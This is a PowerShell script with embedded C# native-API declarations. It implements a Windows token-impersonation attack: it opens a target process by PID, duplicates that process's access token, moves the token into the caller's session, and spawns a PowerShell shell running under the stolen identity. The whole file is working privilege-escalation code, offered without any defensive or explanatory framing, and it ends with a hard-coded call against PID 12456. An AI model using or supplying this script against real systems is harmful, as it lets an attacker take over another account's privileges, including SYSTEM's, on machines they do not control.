Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NativeMethods {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetTokenInformation(
        IntPtr TokenHandle,
        int TokenInformationClass,
        ref uint TokenInformation,
        uint TokenInformationLength);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
}
"@

function Invoke-ImpersonatedCommand {
    param (
        [Parameter(Mandatory = $true)]
        [int]$TargetPid
    )

    $PROCESS_QUERY_INFORMATION = 0x0400
    $TOKEN_DUPLICATE = 0x0002
    $TOKEN_QUERY = 0x0008
    $MAXIMUM_ALLOWED = 0x02000000
    $CREATE_NEW_CONSOLE = 0x00000010
    $TokenSessionId = 12

    $TokenPrimary = 1
    $SecurityImpersonation = 2

    $si = New-Object NativeMethods+STARTUPINFO
    $pi = New-Object NativeMethods+PROCESS_INFORMATION
    $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
    $si.lpDesktop = "winsta0\default"

    $hProcess = [NativeMethods]::OpenProcess($PROCESS_QUERY_INFORMATION, $false, [uint32]$TargetPid)
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Error "[-] Failed to open process. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    $hToken = [IntPtr]::Zero
    if (-not [NativeMethods]::OpenProcessToken($hProcess, $TOKEN_DUPLICATE -bor $TOKEN_QUERY, [ref]$hToken)) {
        Write-Error "[-] Failed to open process token. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        [NativeMethods]::CloseHandle($hProcess) | Out-Null
        return
    }

    $hDupToken = [IntPtr]::Zero
    if (-not [NativeMethods]::DuplicateTokenEx($hToken, $MAXIMUM_ALLOWED, [IntPtr]::Zero, $SecurityImpersonation, $TokenPrimary, [ref]$hDupToken)) {
        Write-Error "[-] Failed to duplicate token. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        [NativeMethods]::CloseHandle($hToken) | Out-Null
        [NativeMethods]::CloseHandle($hProcess) | Out-Null
        return
    }

    $mySessionId = [uint32](Get-Process -Id $PID).SessionId
    Write-Host "[*] Setting token session to: $mySessionId"

    if (-not [NativeMethods]::SetTokenInformation($hDupToken, $TokenSessionId, [ref]$mySessionId, 4)) {
        Write-Error "[-] SetTokenInformation failed. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        [NativeMethods]::CloseHandle($hDupToken) | Out-Null
        [NativeMethods]::CloseHandle($hToken) | Out-Null
        [NativeMethods]::CloseHandle($hProcess) | Out-Null
        return
    }

    $executable = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

    if (-not [NativeMethods]::CreateProcessAsUser(
        $hDupToken,
        $executable,
        $null,
        [IntPtr]::Zero,
        [IntPtr]::Zero,
        $false,
        $CREATE_NEW_CONSOLE,
        [IntPtr]::Zero,
        "C:\Users\Public",
        [ref]$si,
        [ref]$pi)) {
        Write-Error "[-] CreateProcessAsUser failed. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        [NativeMethods]::CloseHandle($hDupToken) | Out-Null
        [NativeMethods]::CloseHandle($hToken) | Out-Null
        [NativeMethods]::CloseHandle($hProcess) | Out-Null
        return
    }

    Write-Host "[+] PowerShell launched successfully in your session with impersonated token!"

    [NativeMethods]::CloseHandle($hToken) | Out-Null
    [NativeMethods]::CloseHandle($hDupToken) | Out-Null
    [NativeMethods]::CloseHandle($hProcess) | Out-Null
    [NativeMethods]::CloseHandle($pi.hThread) | Out-Null
    [NativeMethods]::CloseHandle($pi.hProcess) | Out-Null
}

Invoke-ImpersonatedCommand -TargetPid 12456
